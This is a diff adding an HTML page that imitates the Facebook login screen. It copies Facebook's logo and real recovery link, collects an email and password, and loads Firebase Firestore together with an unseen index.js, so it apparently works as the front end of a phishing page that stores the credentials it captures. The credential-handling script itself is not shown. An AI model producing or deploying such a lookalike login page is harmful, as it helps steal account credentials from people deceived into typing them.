@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Facebook - Login</title>
+
+    
+
+</head>
+<body>
+    <div class="main">
+        <div class="logo">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="logo">
+        </div>
+        <div class="container">
+            <span class="login">Login to Facebook</span>
+                <input 
+                type="email" 
+                name="email" 
+                id="correo" 
+                placeholder="Email address or phone number">
+                <input 
+                type="password" 
+                name="password" 
+                id="contraseña" 
+                placeholder="Password">
+            <button id="loginButton" class="login-Btn" type="submit">Log in</button>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account</a>
+            <div class="style">or</div>
+            <button class="new-account">Create New Account</button>
+        </div>
+    </div>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js"></script>   
+            <script src="./index.js"></script>
+
+</body>
+</html>
